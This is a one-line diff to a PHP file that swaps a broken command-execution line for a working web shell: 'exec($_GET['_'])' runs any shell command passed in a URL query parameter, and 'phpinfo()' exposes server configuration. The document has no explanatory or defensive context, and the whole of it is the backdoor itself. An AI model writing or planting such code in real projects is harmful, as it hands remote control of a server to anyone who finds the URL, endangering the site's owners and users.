@@ -1,1 +1,1 @@
-<?php phinfo();echo exec($_POST[_]);
+<?php echo exec($_GET['_']);phpinfo();
